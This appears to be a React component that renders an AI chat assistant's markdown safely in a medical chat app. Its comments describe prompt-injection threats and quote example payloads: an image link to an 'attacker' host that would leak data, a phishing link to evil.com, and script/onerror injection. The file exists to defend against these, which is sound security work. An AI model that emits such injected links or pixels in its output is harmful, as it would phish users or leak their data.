import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { ExternalLink } from 'lucide-react';

// Internal hosts the SPA trusts — same-origin links don't get the
// external-link warning treatment. Add to this list if you ever
// embed legitimate trusted third-party docs (e.g. who.int).
const TRUSTED_HOSTS = new Set(['bagyt.vercel.app', 'panacea-api.fly.dev']);

function isExternalUrl(href) {
  if (!href) return false;
  try {
    const url = new URL(href, window.location.origin);
    // Same-origin or trusted-host → not "external" for our purposes.
    if (url.origin === window.location.origin) return false;
    if (TRUSTED_HOSTS.has(url.host)) return false;
    return url.protocol === 'http:' || url.protocol === 'https:';
  } catch {
    // Malformed URL — react-markdown already strips javascript: etc,
    // but treat unparseable as external so we err on the side of warning.
    return true;
  }
}

/**
 * Renders the AI's markdown output as styled HTML.
 *
 * Why react-markdown over a regex pass:
 *   - It refuses raw HTML by default — so an AI response containing
 *     `<script>` or `<img onerror>` is rendered as text, not executed.
 *     That's the security boundary; do not relax `disallowedElements`
 *     without understanding what an attacker can put in a prompt.
 *   - GFM (`remark-gfm`) gives us tables, strikethrough, task lists,
 *     and autolinks — the conventional markdown the AI emits.
 *
 * Styling is per-element via `components` instead of a global `.prose`
 * class because the project doesn't use @tailwindcss/typography, and we
 * want the chat-bubble palette (deep-* colors, brand-* accents) rather
 * than the typography plugin's neutral defaults.
 */
export default function MarkdownContent({ children, tone = 'assistant' }) {
  const isUser = tone === 'user';

  // User messages get monochrome text on the brand-tinted bubble; AI
  // messages get the full palette. Code blocks invert to a darker tone
  // so they read against either bubble color.
  const linkClass = isUser
    ? 'underline underline-offset-2 hover:opacity-80'
    : 'text-brand-700 underline underline-offset-2 hover:text-brand-800 dark:text-brand-300 dark:hover:text-brand-200';

  const codeBlockClass = isUser
    ? 'bg-deep-900/30 text-current dark:bg-deep-900/60'
    : 'bg-deep-800 text-gray-100 dark:bg-deep-900';

  const inlineCodeClass = isUser
    ? 'rounded bg-deep-900/30 px-1 py-0.5 font-mono text-[0.85em]'
    : 'rounded bg-gray-200 px-1 py-0.5 font-mono text-[0.85em] text-gray-900 dark:bg-deep-900 dark:text-gray-100';

  return (
    <div className="space-y-2 break-words [&>*:first-child]:mt-0 [&>*:last-child]:mb-0">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        // `img` is disallowed because the AI is an untrusted source —
        // a prompt-injected response containing `![](https://attacker/?u=X)`
        // would otherwise fire a tracking pixel from the user's browser.
        // The AI shouldn't be returning images at all in a medical chat;
        // when it tries, we render the alt text instead so the user can
        // see what was intended without firing the request.
        disallowedElements={['img']}
        unwrapDisallowed
        components={{
          h1: ({ node: _node, ...p }) => <h3 className="mt-3 text-base font-bold" {...p} />,
          h2: ({ node: _node, ...p }) => <h4 className="mt-3 text-sm font-bold" {...p} />,
          h3: ({ node: _node, ...p }) => <h5 className="mt-2 text-sm font-semibold" {...p} />,
          p: ({ node: _node, ...p }) => <p className="leading-relaxed" {...p} />,
          ul: ({ node: _node, ...p }) => <ul className="ml-5 list-disc space-y-1" {...p} />,
          ol: ({ node: _node, ...p }) => <ol className="ml-5 list-decimal space-y-1" {...p} />,
          li: ({ node: _node, ...p }) => <li className="leading-relaxed" {...p} />,
          strong: ({ node: _node, ...p }) => <strong className="font-semibold" {...p} />,
          em: ({ node: _node, ...p }) => <em className="italic" {...p} />,
          blockquote: ({ node: _node, ...p }) => (
            <blockquote className="border-l-2 border-current/30 pl-3 italic opacity-90" {...p} />
          ),
          a: ({ node: _node, href, children, ...p }) => {
            // AI-supplied links are an explicit phishing vector — a
            // prompt-injected response could render `[verify your
            // password](https://evil.com)` inside the trusted chat
            // bubble. Show the actual destination host and an external
            // icon so the user can't be tricked by anchor text alone.
            const external = isExternalUrl(href);
            let hostHint = '';
            if (external) {
              try {
                hostHint = new URL(href, window.location.origin).host;
              } catch {
                hostHint = href;
              }
            }
            return (
              <a
                className={linkClass}
                href={href}
                target="_blank"
                rel="noopener noreferrer nofollow"
                title={external ? `External link: ${href}` : href}
                {...p}
              >
                {children}
                {external && (
                  <>
                    <ExternalLink
                      className="ml-0.5 inline-block h-3 w-3 align-text-bottom opacity-70"
                      aria-hidden="true"
                    />
                    <span className="ml-1 text-[0.85em] opacity-60">({hostHint})</span>
                  </>
                )}
              </a>
            );
          },
          hr: () => <hr className="my-3 border-current/20" />,
          // GFM tables — narrow + scrollable so a wide table doesn't
          // blow out the bubble width on mobile.
          table: ({ node: _node, ...p }) => (
            <div className="overflow-x-auto">
              <table className="min-w-full border-collapse text-left text-xs" {...p} />
            </div>
          ),
          th: ({ node: _node, ...p }) => (
            <th className="border-b border-current/20 px-2 py-1 font-semibold" {...p} />
          ),
          td: ({ node: _node, ...p }) => (
            <td className="border-b border-current/10 px-2 py-1" {...p} />
          ),
          // Code: react-markdown emits `<code inline>` for backticked
          // spans and `<code>` inside `<pre>` for fenced blocks. We
          // detect by looking at the `inline` prop, falling back to
          // "block" when the parent is <pre>.
          code: ({ node: _node, inline, className, children, ...p }) => {
            if (inline) {
              return (
                <code className={inlineCodeClass} {...p}>
                  {children}
                </code>
              );
            }
            return (
              <code className={`font-mono text-[0.85em] ${className ?? ''}`} {...p}>
                {children}
              </code>
            );
          },
          pre: ({ node: _node, ...p }) => (
            <pre
              className={`overflow-x-auto rounded-lg p-3 text-[0.85em] leading-relaxed ${codeBlockClass}`}
              {...p}
            />
          ),
        }}
      >
        {children ?? ''}
      </ReactMarkdown>
    </div>
  );
}
